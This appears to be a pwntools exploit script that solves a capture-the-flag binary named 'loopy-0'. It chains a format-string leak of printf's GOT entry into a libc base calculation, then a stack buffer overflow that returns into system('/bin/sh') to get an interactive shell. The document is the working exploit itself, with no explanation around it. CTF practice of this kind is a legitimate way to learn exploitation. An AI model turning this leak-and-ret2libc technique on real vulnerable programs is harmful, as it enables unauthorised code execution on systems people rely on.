from pwn import *

libc = ELF('libc.so.6')
system = libc.symbols['system']
shell = next(libc.search('/bin/sh'))
libc_setvbuf = libc.symbols['printf']

e = ELF('loopy-0')
printf = e.got['printf']

# p = remote('shell.2019.nactf.com', 31283)
p = process('./loopy-0')

payload = p32(printf) + '%4$s' + 'A' * 68 + p32(e.symbols['vuln'])

p.sendline(payload)
p.recvuntil('You typed: ')
p.recv(4)
leak = u32(p.recv(4))
log.info("leak: " + hex(leak))

libc_base = leak - libc_setvbuf

system = libc_base + system
shell = libc_base + shell

log.info("system @ " + hex(system))
log.info("shell @ " + hex(shell))

p.sendline('A'*76+p32(system)+p32(0x0)+p32(shell))
p.interactive()